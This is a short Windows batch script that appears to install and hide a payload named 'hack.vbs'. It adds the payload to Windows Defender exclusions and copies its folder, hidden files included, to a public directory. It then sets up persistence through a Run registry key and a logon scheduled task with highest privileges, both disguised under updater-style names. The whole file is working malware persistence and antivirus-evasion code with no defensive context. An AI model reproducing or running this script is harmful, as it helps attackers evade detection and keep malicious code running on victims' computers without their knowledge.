@echo off
set payloadPath=%~dp0hack.vbs  :: The payload is located in the same folder as the batch script
set taskName=WindowsUpdater
set sourceFolder=%~dp0    :: Get the folder where the batch file is located
set destinationFolder=C:\Users\Public\Videos

:: Add the payload to Windows Defender exclusions (PowerShell method)
powershell -Command "Add-MpPreference -ExclusionPath '%payloadPath%'"

:: Copy the folder and its contents to the destination folder
xcopy "%sourceFolder%" "%destinationFolder%" /E /I /H /Y

:: Add to startup (Registry)
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "%~f0" /f

:: Create Scheduled Task to run batch file after every restart
schtasks /create /sc onlogon /tn %taskName% /tr "%~f0" /f /rl highest
